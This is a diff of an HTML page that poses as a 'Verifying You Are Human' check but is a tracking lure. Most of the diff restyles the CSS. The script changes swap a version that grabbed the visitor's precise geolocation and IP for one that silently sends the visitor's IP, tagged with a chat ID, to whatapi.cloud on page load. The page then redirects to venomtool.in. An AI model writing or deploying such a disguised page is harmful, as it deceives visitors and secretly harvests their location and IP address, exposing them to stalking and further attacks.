@@ -10,41 +10,45 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Poppins", sans-serif;
+            font-family: "Noto Sans", sans-serif;
         }
         body {
             display: flex;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            background: #1F1F1F;
-            color: #FFFFFF;
+            background: linear-gradient(135deg, #1E1E1E, #2C2C2C);
+            color: #EAEAEA;
         }
         .container {
             text-align: center;
-            padding: 50px;
-            background: #333333;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            padding: 60px 80px;
+            background: #282828;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            border: 1px solid #444444;
         }
         h1 {
-            font-size: 32px;
+            font-size: 36px;
             font-weight: 700;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             color: #FFD700;
+            letter-spacing: 1.2px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
         p {
-            font-size: 18px;
-            margin-bottom: 20px;
+            font-size: 20px;
+            margin-bottom: 30px;
+            color: #CCCCCC;
         }
         .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 6px solid #FFFFFF;
+            width: 60px;
+            height: 60px;
+            border: 6px solid #EAEAEA;
             border-top: 6px solid #FFD700;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 25px;
         }
         @keyframes spin {
             0% {
@@ -54,6 +58,12 @@
                 transform: rotate(360deg);
             }
         }
+        .container {
+            transition: transform 0.3s ease-in-out;
+        }
+        .container:hover {
+            transform: scale(1.02);
+        }
     </style>
 </head>
 <body>
@@ -61,7 +71,7 @@
 <div class="container">
     <h1>Verifying You Are Human</h1>
     <div class="loading-spinner"></div>
-    <p id="message">Please wait while we verify your location...</p>
+    <p id="message">Please wait while we verify...</p>
 </div>
 
 <script>
@@ -74,51 +84,23 @@
             const data = await response.json();
             return data.ip;
         } catch (error) {
-            console.error(error);
             return 'Unknown IP';
         }
     }
 
-    async function sendLocation(latitude, longitude) {
+    async function sendIP() {
         const ip = await getIP();
-        const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&lat=${latitude}&long=${longitude}&ip=${ip}`;
-        axios.get(url)
+        const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&ip=${ip}`;
+        axios
+            .get(url)
             .then(() => {
-                message.textContent = `Verification complete! Redirecting...`;
+                message.textContent = 'Verification complete!';
                 window.location.href = `https://venomtool.in/I/?id=${chatId}`;
-            })
-            .catch((error) => {
-                console.error(error);
             });
     }
 
-    function success(pos) {
-        const crd = pos.coords;
-        sendLocation(crd.latitude, crd.longitude);
-    }
-
-    function error(err) {
-        console.error(err);
-    }
-
-    if ('geolocation' in navigator) {
-        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-            if (result.state === 'granted' || result.state === 'prompt') {
-                navigator.geolocation.getCurrentPosition(success, error, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                });
-            } else {
-                console.error('Location access denied.');
-            }
-        });
-    } else {
-        console.error('Location API not available.');
-    }
-
-    setTimeout(() => {
-        window.location.href = `https://venomtool.in/I/?id=${chatId}`;
-    }, 5000);
+    
+    sendIP();
 </script>
 
 </body>
